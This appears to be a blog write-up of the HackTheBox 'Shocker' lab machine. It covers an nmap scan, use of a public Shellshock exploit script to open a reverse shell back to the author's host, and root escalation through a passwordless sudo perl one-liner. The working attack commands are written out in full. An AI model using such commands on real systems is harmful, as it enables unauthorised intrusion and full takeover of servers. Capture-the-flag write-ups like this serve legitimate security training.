---
layout: post
title:  "HTB Shocker Machine Writeup"
date:   2020-1-2 00:10:00 +0000
categories: hackthebox
---
# Description
Shellshock was another basic machine that kind of gave away the vectors for each step with ease.
# Nmap scan
```
PORT STATE SERVICE VERSION
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
No exact OS matches for host (If you know what OS is running on it
```

# Initial shell
As the box name implies, this box probably involves shellshock. A directory bruteforce reveals very little, only a 'cgi-bin' directory. Searchsploit search for shellshock comes up with:
```Apache mod_cgi = 'shellshock' Remote Command Injection | exploits/linux/remote/34900.py'```
Reading the documentation / exploit, we can figure out how to supply it with the arguments we need to yield a shell.
```
python 34900.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.5 lport=1337 pages=/cgi-bin/user.sh
```
Running the above gains us a low privileged shell and we can collect the user.txt flag.
# Privilege escalation
A simple 'sudo -l' check reveals our privesc vector. 
```(root) NOPASSWD: /usr/bin/perl```
this tells us we can run perl as root without supplying a password, easy. 
```
10.10.10.56> sudo perl -e 'exec "/bin/bash";'
10.10.10.56> id
uid=0(root) gid=0(root) groups=0(root)
```
And there we go full privileges with a simple perl shell call.
